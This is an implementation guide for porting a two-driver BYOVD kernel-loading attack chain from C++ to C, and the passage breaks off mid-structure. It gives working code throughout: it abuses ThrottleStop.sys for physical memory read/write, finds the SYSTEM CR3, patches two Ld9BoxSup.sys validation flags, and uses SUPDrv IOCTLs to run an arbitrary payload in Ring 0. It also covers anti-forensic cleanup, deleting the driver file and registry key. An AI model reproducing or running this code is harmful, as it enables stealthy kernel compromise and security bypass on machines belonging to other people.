# BYOVD KERNEL LOADING - C++ to C + Assembly Port Guide

**Target Platform**: Pure C + Assembly (no C++ runtime, STL, or exceptions)
**Source Files**: `OmbraLoader/supdrv/*`, `OmbraLoader/throttlestop/*`
**Date**: December 2025

---

## Overview

This document provides complete implementation details for porting the two-driver BYOVD (Bring Your Own Vulnerable Driver) attack chain from C++ to pure C + Assembly. The attack uses ThrottleStop.sys to patch Ld9BoxSup.sys validation flags, enabling kernel code loading via SUPDrv's LDR_OPEN/LDR_LOAD IOCTLs.

**Attack Chain Summary**:
```
1. Load ThrottleStop.sys (CVE-2025-7771) → Physical memory R/W primitives
2. Scan physical memory for SYSTEM EPROCESS → Extract CR3
3. Walk page tables → Translate Ld9BoxSup.sys VA to PA
4. Write 1 to driver_base+0x4a1a0 (ntoskrnl flag) and driver_base+0x4a210 (hal flag)
5. Unload ThrottleStop.sys → Clean artifacts
6. SUPDrv LDR_OPEN now succeeds! (bypassed -618 check)
7. SUPDrv LDR_LOAD → Hypervisor payload executes in Ring 0
```

---

## File Inventory

### SUPDrv Exploitation
| File | Lines | Purpose |
|------|-------|---------|
| `supdrv_types.h` | 419 | IOCTL codes, structure definitions, magic constants |
| `supdrv_loader.h` | 246 | SUPDrvLoader class interface |
| `supdrv_loader.cpp` | 1100 | Cookie handshake, version probing, LDR_OPEN/LOAD |
| `driver_deployer.h` | 264 | Driver extraction and deployment |
| `driver_deployer.cpp` | 1380 | SCM/NtLoadDriver methods, artifact cleanup |
| `driver_crypto.h` | 122 | Rolling XOR encryption for embedded drivers |
| `driver_crypto.cpp` | 158 | Encrypt/decrypt implementation |

### ThrottleStop Exploitation
| File | Lines | Purpose |
|------|-------|---------|
| `throttlestop_exploit.h` | 414 | ThrottleStopExploit class, IOCTL structures |
| `throttlestop_exploit.cpp` | 1271 | Physical memory R/W, VA→PA translation, -618 bypass |

**Total**: ~5374 lines of C++ code to port to C.

---

## Architecture Summary

### Two-Driver Attack Chain

```
┌─────────────────────────────────────────────────────────────────┐
│ PHASE 1: ThrottleStop.sys (CVE-2025-7771)                       │
│ Load Time: ~10ms                                                │
├─────────────────────────────────────────────────────────────────┤
│ 1. Create service "ThrottleStop_Ombra_<timestamp>"              │
│ 2. StartService → Driver creates \\.\<ServiceName> device       │
│ 3. Open device handle                                           │
│ 4. GetSystemCr3() → Scan physical memory for "System" EPROCESS  │
│    - Read PA 0x1a2000-0x1af000 (common EPROCESS locations)      │
│    - Match "System" at offset 0x5a8                             │
│    - Extract DirectoryTableBase at offset 0x28 (CR3)            │
│ 5. Patch618Flags(ld9BoxBase):                                   │
│    - TranslateVirtToPhys(cr3, ld9BoxBase + 0x4a1a0) → PA1       │
│    - TranslateVirtToPhys(cr3, ld9BoxBase + 0x4a210) → PA2       │
│    - WritePhysical1(PA1, 1) → Set ntoskrnl flag                 │
│    - WritePhysical1(PA2, 1) → Set hal flag                      │
│ 6. CloseHandle, StopService, DeleteService                      │
│ 7. Secure file deletion (3-pass zero-overwrite)                 │
├─────────────────────────────────────────────────────────────────┤
│ RESULT: -618 check bypassed, ThrottleStop completely removed    │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ PHASE 2: Ld9BoxSup.sys (SUPDrv) Exploitation                    │
│ Load Time: ~50ms                                                │
├─────────────────────────────────────────────────────────────────┤
│ 1. Extract driver from PE resources (XOR encrypted)             │
│ 2. NtLoadDriver or SCM CreateService/StartService               │
│ 3. Open device via NtCreateFile(\Device\Ld9BoxDrv)              │
│ 4. SUP_IOCTL_COOKIE (0x228204) → Version probe handshake        │
│    - Try versions: 0x320000, 0x290008, 0x290007, 0x290006       │
│    - Cookie: 0x69726F74 ("tori")                                │
│    - Magic: "The Magic Word!"                                   │
│ 5. SUP_IOCTL_LDR_OPEN (0x22820C) → Allocate kernel memory       │
│    - Returns pvImageBase (kernel executable address)            │
│    - Check passes! (flags patched by ThrottleStop)              │
│ 6. SUP_IOCTL_LDR_LOAD (0x228210) → Load and execute             │
│    - Copy payload to pvImageBase                                │
│    - pfnModuleInit(pvImageBase) called in Ring 0                │
│    - Hypervisor patches VMExit handler → ACTIVE                 │
│ 7. Delete registry key and driver file while driver is in memory│
├─────────────────────────────────────────────────────────────────┤
│ RESULT: Hypervisor active, minimal forensic footprint           │
└─────────────────────────────────────────────────────────────────┘
```

---

## ThrottleStop.sys Exploitation (CVE-2025-7771)

### IOCTL Code Table

| IOCTL | Value | Input Buffer | Output Buffer | Purpose |
|-------|-------|--------------|---------------|---------|
| `IOCTL_PHYS_READ` | `0x80006498` | 8 bytes (PhysAddr) | 1/2/4/8 bytes (determines size!) | Read physical memory |
| `IOCTL_PHYS_WRITE` | `0x8000649C` | 9/10/12/16 bytes (PhysAddr + Value) | NULL | Write physical memory |

**CRITICAL**: ThrottleStop uses an unusual IOCTL convention:
- **Read size** is determined by `OutputBufferLength` (1, 2, 4, or 8 bytes)
- **Write size** is determined by `InputBufferLength - 8` (9→1 byte, 10→2 bytes, 12→4 bytes, 16→8 bytes)
- There is NO "Size" field in the structures!

### Structure Definitions

```c
#pragma pack(push, 1)

// Write requests: PhysAddr (8 bytes) + Value (1/2/4/8 bytes)
typedef struct _PHYS_WRITE_REQUEST_8 {
    UINT64 PhysicalAddress;
    UINT64 Value;
} PHYS_WRITE_REQUEST_8;

typedef struct _PHYS_WRITE_REQUEST_4 {
    UINT64 PhysicalAddress;
    UINT32 Value;
} PHYS_WRITE_REQUEST_4;

typedef struct _PHYS_WRITE_REQUEST_2 {
    UINT64 PhysicalAddress;
    UINT16 Value;
} PHYS_WRITE_REQUEST_2;

typedef struct _PHYS_WRITE_REQUEST_1 {
    UINT64 PhysicalAddress;
    UINT8 Value;
} PHYS_WRITE_REQUEST_1;

#pragma pack(pop)
```

### Physical Memory Primitives (C Implementation)

```c
// Read 1 byte from physical memory
BOOL ThrottleStop_ReadPhysical1(HANDLE hDevice, UINT64 physAddr, UINT8* pValue) {
    DWORD dwReturned = 0;
    return DeviceIoControl(
        hDevice,
        0x80006498,          // IOCTL_PHYS_READ
        &physAddr,           // Input: just the 8-byte PA
        8,                   // Input size: 8
        pValue,              // Output: where to store result
        1,                   // Output size: 1 (determines read size!)
        &dwReturned,
        NULL
    );
}

// Write 1 byte to physical memory
BOOL ThrottleStop_WritePhysical1(HANDLE hDevice, UINT64 physAddr, UINT8 value) {
    PHYS_WRITE_REQUEST_1 req;
    req.PhysicalAddress = physAddr;
    req.Value = value;

    DWORD dwReturned = 0;
    return DeviceIoControl(
        hDevice,
        0x8000649C,          // IOCTL_PHYS_WRITE
        &req,                // Input: PA + Value
        9,                   // Input size: 9 (8 + 1)
        NULL,                // No output
        0,
        &dwReturned,
        NULL
    );
}

// Read 8 bytes from physical memory
BOOL ThrottleStop_ReadPhysical8(HANDLE hDevice, UINT64 physAddr, UINT64* pValue) {
    DWORD dwReturned = 0;
    return DeviceIoControl(
        hDevice,
        0x80006498,
        &physAddr,
        8,
        pValue,
        8,                   // Output size: 8 (reads 8 bytes!)
        &dwReturned,
        NULL
    );
}

// Write 8 bytes to physical memory
BOOL ThrottleStop_WritePhysical8(HANDLE hDevice, UINT64 physAddr, UINT64 value) {
    PHYS_WRITE_REQUEST_8 req;
    req.PhysicalAddress = physAddr;
    req.Value = value;

    DWORD dwReturned = 0;
    return DeviceIoControl(
        hDevice,
        0x8000649C,
        &req,
        16,                  // Input size: 16 (8 + 8)
        NULL,
        0,
        &dwReturned,
        NULL
    );
}
```

### Page Table Walking (VA→PA Translation)

```c
// Page table constants
#define PAGE_PRESENT    0x1ULL
#define PAGE_LARGE      0x80ULL
#define PFN_MASK        0x000FFFFFFFFFF000ULL

#define PML4E_SHIFT     39
#define PDPTE_SHIFT     30
#define PDE_SHIFT       21
#define PTE_SHIFT       12
#define OFFSET_MASK     0xFFFULL

BOOL TranslateVirtToPhys(HANDLE hDevice, UINT64 cr3, UINT64 virtualAddr, UINT64* pPhysAddr) {
    // Extract page table indices
    UINT64 pml4Index = (virtualAddr >> PML4E_SHIFT) & 0x1FF;
    UINT64 pdptIndex = (virtualAddr >> PDPTE_SHIFT) & 0x1FF;
    UINT64 pdIndex   = (virtualAddr >> PDE_SHIFT) & 0x1FF;
    UINT64 ptIndex   = (virtualAddr >> PTE_SHIFT) & 0x1FF;
    UINT64 offset    = virtualAddr & OFFSET_MASK;

    // Read PML4E
    UINT64 pml4eAddr = (cr3 & PFN_MASK) + (pml4Index * 8);
    UINT64 pml4e = 0;
    if (!ThrottleStop_ReadPhysical8(hDevice, pml4eAddr, &pml4e)) {
        return FALSE;
    }
    if (!(pml4e & PAGE_PRESENT)) {
        return FALSE;
    }

    // Read PDPTE
    UINT64 pdpteAddr = (pml4e & PFN_MASK) + (pdptIndex * 8);
    UINT64 pdpte = 0;
    if (!ThrottleStop_ReadPhysical8(hDevice, pdpteAddr, &pdpte)) {
        return FALSE;
    }
    if (!(pdpte & PAGE_PRESENT)) {
        return FALSE;
    }

    // Check for 1GB page
    if (pdpte & PAGE_LARGE) {
        *pPhysAddr = (pdpte & 0x000FFFFFC0000000ULL) | (virtualAddr & 0x3FFFFFFFULL);
        return TRUE;
    }

    // Read PDE
    UINT64 pdeAddr = (pdpte & PFN_MASK) + (pdIndex * 8);
    UINT64 pde = 0;
    if (!ThrottleStop_ReadPhysical8(hDevice, pdeAddr, &pde)) {
        return FALSE;
    }
    if (!(pde & PAGE_PRESENT)) {
        return FALSE;
    }

    // Check for 2MB page
    if (pde & PAGE_LARGE) {
        *pPhysAddr = (pde & 0x000FFFFFFFE00000ULL) | (virtualAddr & 0x1FFFFFULL);
        return TRUE;
    }

    // Read PTE
    UINT64 pteAddr = (pde & PFN_MASK) + (ptIndex * 8);
    UINT64 pte = 0;
    if (!ThrottleStop_ReadPhysical8(hDevice, pteAddr, &pte)) {
        return FALSE;
    }
    if (!(pte & PAGE_PRESENT)) {
        return FALSE;
    }

    // 4KB page
    *pPhysAddr = (pte & PFN_MASK) | offset;
    return TRUE;
}
```

### Get SYSTEM Process CR3

```c
// EPROCESS structure offsets (Windows 10/11 22H2)
#define EPROCESS_DIRECTORY_TABLE_BASE   0x28    // CR3
#define EPROCESS_IMAGE_FILE_NAME        0x5a8   // "System" string

UINT64 GetSystemCr3(HANDLE hDevice) {
    // Common physical addresses for SYSTEM EPROCESS
    UINT64 commonAddresses[] = {
        0x1a2000, 0x1a3000, 0x1a4000, 0x1a5000,
        0x1a6000, 0x1a7000, 0x1a8000, 0x1a9000,
        0x1aa000, 0x1ab000, 0x1ac000, 0x1ad000,
        0x1ae000, 0x1af000, 0x1b0000
    };

    // "System" in little-endian: 53 79 73 74 65 6d 00 XX
    // First 6 bytes: 0x00006d6574737953
    const UINT64 systemMask = 0x0000FFFFFFFFFFFFULL;
    const UINT64 systemStr  = 0x00006d6574737953ULL;

    for (int i = 0; i < sizeof(commonAddresses) / sizeof(UINT64); i++) {
        UINT64 baseAddr = commonAddresses[i];

        // Read ImageFileName at offset 0x5a8
        UINT64 imageFileName = 0;
        if (!ThrottleStop_ReadPhysical8(hDevice, baseAddr + 0x5a8, &imageFileName)) {
            continue;
        }

        // Check for "System"
        if ((imageFileName & systemMask) == systemStr) {
            // Read DirectoryTableBase at offset 0x28
            UINT64 cr3 = 0;
            if (!ThrottleStop_ReadPhysical8(hDevice, baseAddr + 0x28, &cr3)) {
                continue;
            }

            // Validate CR3 - must be page-aligned
            if ((cr3 & 0xFFF) == 0 && cr3 != 0 && cr3 < 0x200000000000ULL) {
                return cr3;
            }
        }
    }

    // Fallback: scan first 16MB
    for (UINT64 baseAddr = 0x100000; baseAddr < 0x1000000; baseAddr += 0x1000) {
        UINT64 imageFileName = 0;
        if (!ThrottleStop_ReadPhysical8(hDevice, baseAddr + 0x5a8, &imageFileName)) {
            continue;
        }

        if ((imageFileName & systemMask) == systemStr) {
            UINT64 cr3 = 0;
            if (ThrottleStop_ReadPhysical8(hDevice, baseAddr + 0x28, &cr3)) {
                if ((cr3 & 0xFFF) == 0 && cr3 != 0 && cr3 < 0x200000000000ULL) {
                    return cr3;
                }
            }
        }
    }

    return 0;  // Not found
}
```

### -618 Bypass Implementation

```c
// Flag offsets from binary analysis (Dec 2025)
#define NTOSKRNL_FLAG_OFFSET    0x4a1a0
#define HAL_FLAG_OFFSET         0x4a210

BOOL Patch618Flags(HANDLE hDevice, UINT64 systemCr3, UINT64 ld9BoxBase) {
    // Calculate flag virtual addresses
    UINT64 ntoskrnlFlagVA = ld9BoxBase + NTOSKRNL_FLAG_OFFSET;
    UINT64 halFlagVA = ld9BoxBase + HAL_FLAG_OFFSET;

    // Translate to physical addresses
    UINT64 ntoskrnlFlagPA = 0;
    UINT64 halFlagPA = 0;

    if (!TranslateVirtToPhys(hDevice, systemCr3, ntoskrnlFlagVA, &ntoskrnlFlagPA)) {
        return FALSE;
    }

    if (!TranslateVirtToPhys(hDevice, systemCr3, halFlagVA, &halFlagPA)) {
        return FALSE;
    }

    // Write 1 to both flags
    if (!ThrottleStop_WritePhysical1(hDevice, ntoskrnlFlagPA, 1)) {
        return FALSE;
    }

    if (!ThrottleStop_WritePhysical1(hDevice, halFlagPA, 1)) {
        return FALSE;
    }

    // Verify writes
    UINT8 verifyNtoskrnl = 0, verifyHal = 0;
    ThrottleStop_ReadPhysical1(hDevice, ntoskrnlFlagPA, &verifyNtoskrnl);
    ThrottleStop_ReadPhysical1(hDevice, halFlagPA, &verifyHal);

    return (verifyNtoskrnl == 1 && verifyHal == 1);
}
```

---

## SUPDrv (Ld9BoxSup.sys) Exploitation

### IOCTL Code Table

| IOCTL | Function # | Code | cbIn | cbOut | Purpose |
|-------|-----------|------|------|-------|---------|
| `SUP_IOCTL_COOKIE` | 1 | `0x228204` | 48 | 56 | Session handshake |
| `SUP_IOCTL_QUERY_INFO` | 2 | `0x228208` | 24 | 16608 | LDPlayer added |
| `SUP_IOCTL_LDR_OPEN` | 3 | `0x22820C` | 328 | 40 | Allocate kernel memory |
| `SUP_IOCTL_LDR_LOAD` | 4 | `0x228210` | variable | 32 | Load module, execute init |
| `SUP_IOCTL_PAGE_ALLOC_EX` | 10 | `0x228228` | 32 | 24+cPages*8 | Dual R3/R0 mapping |
| `SUP_IOCTL_MSR_PROBER` | 34 | `0x228288` | varies | varies | Read/write MSRs (DISABLED!) |

**CRITICAL**: LDPlayer shifted function numbers from standard VirtualBox:
- They inserted `QUERY_INFO` at function 2
- `LDR_OPEN` moved from function 6 to function 3
- `LDR_LOAD` moved from function 7 to function 4

IOCTL formula: `((0x22) << 16) | ((0x02) << 14) | (((func) | 128) << 2) | (0)`

### Structure Definitions

```c
#pragma pack(push, 1)

//-----------------------------------------------------------------------------
// Common Request Header (24 bytes)
//-----------------------------------------------------------------------------
typedef struct _SUPREQHDR {
    UINT32 u32Cookie;           // Cookie from handshake
    UINT32 u32SessionCookie;    // Session cookie
    UINT32 cbIn;                // Input buffer size
    UINT32 cbOut;               // Output buffer size
    UINT32 fFlags;              // 0x42000042 (SUPREQHDR_FLAGS_MAGIC)
    INT32  rc;                  // VirtualBox status code
} SUPREQHDR;

//-----------------------------------------------------------------------------
// SUP_IOCTL_COOKIE (0x228204) - Session Handshake
// cbIn = 48 (0x30), cbOut = 56 (0x38)
//-----------------------------------------------------------------------------
typedef struct _SUPCOOKIE_IN {
    char     szMagic[16];       // "The Magic Word!" (MUST be first!)
    UINT32   u32ReqVersion;     // Version we request (e.g., 0x320000)
    UINT32   u32MinVersion;     // Minimum we accept (major version)
} SUPCOOKIE_IN;

typedef struct _SUPCOOKIE_OUT {
    UINT32   u32Cookie;         // Returned cookie (for subsequent calls)
    UINT32   u32SessionCookie;  // Session cookie
    UINT32   u32SessionVersion; // Driver session version
    UINT32   u32DriverVersion;  // Driver revision
    UINT32   cFunctions;        // Number of exported functions
    UINT32   u32Padding;        // ALIGNMENT (8-byte align pSession)
    UINT64   pSession;          // Session pointer (kernel address)
} SUPCOOKIE_OUT;  // 32 bytes

typedef struct _SUPCOOKIE {
    SUPREQHDR Hdr;              // 24 bytes
    union {
        SUPCOOKIE_IN In;        // 24 bytes
        SUPCOOKIE_OUT Out;      // 32 bytes
    } u;
} SUPCOOKIE;

//-----------------------------------------------------------------------------
// SUP_IOCTL_LDR_OPEN (0x22820C) - Allocate Kernel Memory
// cbIn = 328 (0x148), cbOut = 40 (0x28)
//-----------------------------------------------------------------------------
typedef struct _SUPLDROPEN_IN {
    UINT32   cbImageWithTabs;   // Total image size (with symbols)
    UINT32   cbImageBits;       // Code + data only (MUST be < cbImageWithTabs!)
    char     szName[32];        // Module name
    char     szFilename[260];   // Filename (can be fake)
} SUPLDROPEN_IN;  // 300 bytes

typedef struct _SUPLDROPEN_OUT {
    UINT64   pvImageBase;       // RETURNED: Kernel address for code
    INT32    fNativeLoader;     // True if native OS loader used
    UINT32   u32Padding;        // ALIGNMENT
} SUPLDROPEN_OUT;  // 16 bytes

typedef struct _SUPLDROPEN {
    SUPREQHDR Hdr;              // 24 bytes
    union {
        SUPLDROPEN_IN In;       // 300 bytes
        SUPLDROPEN_OUT Out;     // 16 bytes
    } u;
    UINT32 u32EndPadding;       // ALIGNMENT (total 328)
} SUPLDROPEN;

//-----------------------------------------------------------------------------
// SUP_IOCTL_LDR_LOAD (0x228210) - Load Module and Execute
// cbIn = HEADER + IN + imageSize, cbOut = 32
//-----------------------------------------------------------------------------
typedef enum _SUPLDRLOADEP {
    SUPLDRLOADEP_NOTHING = 0,
    SUPLDRLOADEP_VMMR0 = 1,
    SUPLDRLOADEP_SERVICE = 2    // Use this for pfnModuleInit execution
} SUPLDRLOADEP;

typedef struct _SUPLDRLOAD_IN {
    UINT64       pvImageBase;       // Must match LDR_OPEN result
    UINT32       cbImageWithTabs;   // Same as LDR_OPEN
    UINT32       cbImageBits;       // Same as LDR_OPEN

    // Symbol table (set to 0 for raw code)
    UINT32       offSymbols;
    UINT32       cSymbols;
    UINT32       offStrTab;
    UINT32       cbStrTab;

    SUPLDRLOADEP eEPType;           // SUPLDRLOADEP_SERVICE

    // Entry points - CRITICAL: pfnModuleInit is called!
    UINT64       pfnModuleInit;     // Set to entry point offset
    UINT64       pfnModuleTerm;     // Can be NULL

    // VMM-specific (unused for SERVICE)
    UINT64       pvVMMR0;
    UINT64       pvVMMR0EntryFast;
    UINT64       pvVMMR0EntryEx;

    // Image data follows (variable length)
    UINT8        abImage[1];        // Placeholder
} SUPLDRLOAD_IN;

typedef struct _SUPLDRLOAD_OUT {
    INT32 rc;                       // Return code from pfnModuleInit
} SUPLDRLOAD_OUT;

typedef struct _SUPLDRLOAD {
    SUPREQHDR Hdr;
    union {
        SUPLDRLOAD_IN In;
        SUPLDRLOAD_OUT Out;
    } u;
} SUPLDRLOAD;

#pragma pack(pop)
```

### Magic Constants (Verified from Binary Analysis)

```c
// Cookie values
#define SUPCOOKIE_INITIAL_COOKIE    0x69726F74  // "tori" (LDPlayer changed from VBox "Bori")
#define SUPCOOKIE_MAGIC             "The Magic Word!"
#define SUPREQHDR_FLAGS_MAGIC       0x42000042
#define SUPREQHDR_FLAGS_EXTRA_IN    0x00000001

// Known driver versions (try in order)
const UINT32 KNOWN_VERSIONS[] = {
    0x00320000,  // LDPlayer 9.x (VBox 7.x fork) - VERIFIED FROM BINARY
    0x00290008,  // 6.1.36+
    0x00290007,  // 6.1.x early
    0x00290006   // 6.1.x
};

// VirtualBox status codes
#define VINF_SUCCESS                        0
#define VERR_INTERNAL_ERROR                 -225
#define VERR_INVALID_PARAMETER              -87
#define VERR_VM_DRIVER_VERSION_MISMATCH     -3456
#define VERR_LDR_GENERAL_FAILURE            -618  // The check we're bypassing!

// Device names (for NtCreateFile - VirtualBox doesn't create DosDevices symlinks!)
#define NT_DEVICE_NAME_LDPLAYER     L"\\Device\\Ld9BoxDrv"
#define NT_DEVICE_NAME_LDPLAYER_USER L"\\Device\\Ld9BoxDrvU"
#define NT_DEVICE_NAME_VBOX         L"\\Device\\VBoxDrv"

// -618 bypass flag offsets (from binary analysis Dec 2025)
// These are the TWO BYTES we patch via ThrottleStop
#define LD9BOX_NTOSKRNL_FLAG_OFFSET 0x4a1a0
#define LD9BOX_HAL_FLAG_OFFSET      0x4a210
```

### Cookie Handshake Implementation

```c
BOOL SUPDrv_TryCookieWithVersion(HANDLE hDevice, UINT32 version, SUPCOOKIE* pCookie) {
    memset(pCookie, 0, sizeof(SUPCOOKIE));

    // Setup request header
    pCookie->Hdr.u32Cookie = 0x69726F74;  // "tori"
    pCookie->Hdr.u32SessionCookie = GetTickCount();
    pCookie->Hdr.cbIn = 48;   // MUST be exactly 48
    pCookie->Hdr.cbOut = 56;  // MUST be exactly 56
    pCookie->Hdr.fFlags = 0x42000042;
    pCookie->Hdr.rc = -225;   // VERR_INTERNAL_ERROR

    // Setup cookie input
    memcpy(pCookie->u.In.szMagic, "The Magic Word!", 16);
    pCookie->u.In.u32ReqVersion = version;
    pCookie->u.In.u32MinVersion = version & 0xFFFF0000;

    DWORD dwReturned = 0;
    BOOL result = DeviceIoControl(
        hDevice,
        0x228204,        // SUP_IOCTL_COOKIE
        pCookie,
        48,              // Input size MUST match cbIn
        pCookie,
        56,              // Output size MUST match cbOut
        &dwReturned,
        NULL
    );

    if (!result) {
        return FALSE;
    }

    // Check VirtualBox return code
    return (pCookie->Hdr.rc == 0);  // VINF_SUCCESS
}

BOOL SUPDrv_ProbeVersionAndAcquireCookie(HANDLE hDevice, SUPCOOKIE* pCookie) {
    for (int i = 0; i < 4; i++) {
        if (SUPDrv_TryCookieWithVersion(hDevice, KNOWN_VERSIONS[i], pCookie)) {
            return TRUE;
        }
    }
    return FALSE;
}
```

### LDR_OPEN Implementation

```c
BOOL SUPDrv_AllocateKernelMemory(
    HANDLE hDevice,
    const SUPCOOKIE* pCookie,
    SIZE_T cbSize,
    UINT64* ppvImageBase
) {
    SUPLDROPEN ldrOpen;
    memset(&ldrOpen, 0, sizeof(ldrOpen));

    // Setup request header with session cookies
    ldrOpen.Hdr.u32Cookie = pCookie->u.Out.u32Cookie;
    ldrOpen.Hdr.u32SessionCookie = pCookie->u.Out.u32SessionCookie;
    ldrOpen.Hdr.cbIn = 328;   // MUST be exactly 328
    ldrOpen.Hdr.cbOut = 40;   // MUST be exactly 40
    ldrOpen.Hdr.fFlags = 0x42000042;
    ldrOpen.Hdr.rc = -225;

    // Setup LDR_OPEN input
    // CRITICAL: cbImageBits MUST be < cbImageWithTabs (strictly less than!)
    // Binary validation at 0x1400074e4: jb (jump if below)
    ldrOpen.u.In.cbImageWithTabs = (UINT32)(cbSize + 1);  // +1 for fake symbol table
    ldrOpen.u.In.cbImageBits = (UINT32)cbSize;             // Actual code size

    strncpy_s(ldrOpen.u.In.szName, sizeof(ldrOpen.u.In.szName), "OmbraHv", _TRUNCATE);
    strncpy_s(ldrOpen.u.In.szFilename, sizeof(ldrOpen.u.In.szFilename),
              "\\SystemRoot\\OmbraHv.sys", _TRUNCATE);

    DWORD dwReturned = 0;
    BOOL result = DeviceIoControl(
        hDevice,
        0x22820C,        // SUP_IOCTL_LDR_OPEN
        &ldrOpen,
        328,             // Input size MUST match cbIn
        &ldrOpen,
        40,              // Output size MUST match cbOut
        &dwReturned,
        NULL
    );

    if (!result || ldrOpen.Hdr.rc != 0) {
        // If rc == -618, the flags weren't patched!
        return FALSE;
    }

    // Validate kernel address
    if ((UINT64)ldrOpen.u.Out.pvImageBase < 0xFFFF800000000000ULL) {
        return FALSE;  // Not a kernel address!
    }

    *ppvImageBase = ldrOpen.u.Out.pvImageBase;
    return TRUE;
}
```

### LDR_LOAD Implementation

```c
BOOL SUPDrv_LoadAndExecute(
    HANDLE hDevice,
    const SUPCOOKIE* pCookie,
    UINT64 pvKernelBase,
    const void* pvCode,
    SIZE_T cbCode,
    SIZE_T entryPointOffset
) {
    // Calculate total structure size
    SIZE_T cbTotal = sizeof(SUPREQHDR) +
                     sizeof(SUPLDRLOAD_IN) - sizeof(UINT8) +  // -1 for placeholder
                     cbCode;

    // Allocate variable-size structure
    UINT8* buffer = (UINT8*)malloc(cbTotal);
    if (!buffer) {
        return FALSE;
    }
    memset(buffer, 0, cbTotal);

    SUPLDRLOAD* pLdrLoad = (SUPLDRLOAD*)buffer;

    // Setup request header
    pLdrLoad->Hdr.u32Cookie = pCookie->u.Out.u32Cookie;
    pLdrLoad->Hdr.u32SessionCookie = pCookie->u.Out.u32SessionCookie;
    pLdrLoad->Hdr.cbIn = (UINT32)cbTotal;
    pLdrLoad->Hdr.cbOut = 32;  // sizeof(SUPREQHDR) + sizeof(INT32)
    pLdrLoad->Hdr.fFlags = 0x42000042 | 0x00000001;  // EXTRA_IN flag
    pLdrLoad->Hdr.rc = -225;

    // Setup LDR_LOAD input
    pLdrLoad->u.In.pvImageBase = pvKernelBase;
    pLdrLoad->u.In.cbImageWithTabs = (UINT32)(cbCode + 1);
    pLdrLoad->u.In.cbImageBits = (UINT32)cbCode;

    // No symbols
    pLdrLoad->u.In.offSymbols = 0;
    pLdrLoad->u.In.cSymbols = 0;
    pLdrLoad->u.In.offStrTab = 0;
    pLdrLoad->u.In.cbStrTab = 0;

    // Entry point type - SERVICE means pfnModuleInit will be called
    pLdrLoad->u.In.eEPType = SUPLDRLOADEP_SERVICE;

    // CRITICAL: pfnModuleInit is called by the driver!
    // Set it to the entry point within the image
    pLdrLoad->u.In.pfnModuleInit = pvKernelBase + entryPointOffset;
    pLdrLoad->u.In.pfnModuleTerm = 0;

    // VMM-specific (unused)
    pLdrLoad->u.In.pvVMMR0 = 0;
    pLdrLoad->u.In.pvVMMR0EntryFast = 0;
    pLdrLoad->u.In.pvVMMR0EntryEx = 0;

    // Copy image data
    memcpy(pLdrLoad->u.In.abImage, pvCode, cbCode);

    DWORD dwReturned = 0;
    BOOL result = DeviceIoControl(
        hDevice,
        0x228210,        // SUP_IOCTL_LDR_LOAD
        pLdrLoad,
        (DWORD)cbTotal,
        pLdrLoad,
        32,
        &dwReturned,
        NULL
    );

    BOOL success = (result && pLdrLoad->Hdr.rc == 0);
    free(buffer);

    // If we get here with rc == 0, pfnModuleInit has been called!
    // The hypervisor should now be active.
    return success;
}
```

---

## Driver Deployment

### NtLoadDriver Method (Preferred)

```c
// NT types
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;

typedef NTSTATUS (NTAPI* PFN_NtLoadDriver)(UNICODE_STRING* DriverServiceName);
typedef VOID (NTAPI* PFN_RtlInitUnicodeString)(UNICODE_STRING*, PCWSTR);

BOOL DeployDriverViaNtLoadDriver(const WCHAR* wszDriverPath, const WCHAR* wszServiceName) {
    // 1. Create registry key at HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
    WCHAR regPath[512];
    swprintf(regPath, 512, L"SYSTEM\\CurrentControlSet\\Services\\%s", wszServiceName);

    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,
                        NULL, &hKey, NULL) != ERROR_SUCCESS) {
        return FALSE;
    }

    // ImagePath = \??\<DriverPath>
    WCHAR imagePath[MAX_PATH + 4];
    swprintf(imagePath, MAX_PATH + 4, L"\\??\\%s", wszDriverPath);
    RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ,
                   (BYTE*)imagePath, (wcslen(imagePath) + 1) * sizeof(WCHAR));

    // Type = SERVICE_KERNEL_DRIVER (1)
    DWORD dwType = 1;
    RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (BYTE*)&dwType, sizeof(DWORD));

    // Start = SERVICE_DEMAND_START (3)
    DWORD dwStart = 3;
    RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&dwStart, sizeof(DWORD));

    RegCloseKey(hKey);

    // 2. Get ntdll functions
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    PFN_NtLoadDriver NtLoadDriver = (PFN_NtLoadDriver)GetProcAddress(hNtdll, "NtLoadDriver");
    PFN_RtlInitUnicodeString RtlInitUnicodeString =
        (PFN_RtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");

    // 3. Enable SeLoadDriverPrivilege
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        TOKEN_PRIVILEGES tp = {0};
        LookupPrivilegeValueW(NULL, SE_LOAD_DRIVER_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        CloseHandle(hToken);
    }

    // 4. Load driver
    WCHAR ntRegPath[512];
    swprintf(ntRegPath, 512, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\%s",
             wszServiceName);

    UNICODE_STRING usDriverPath;
    RtlInitUnicodeString(&usDriverPath, ntRegPath);

    NTSTATUS status = NtLoadDriver(&usDriverPath);
    if (status < 0 && status != 0xC000010EL) {  // STATUS_IMAGE_ALREADY_LOADED is OK
        return FALSE;
    }

    return TRUE;
}
```

### Opening Device with NtCreateFile

```c
// VirtualBox/LDPlayer drivers do NOT create DosDevices symlinks!
// MUST use NtCreateFile with NT device paths.

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING* ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
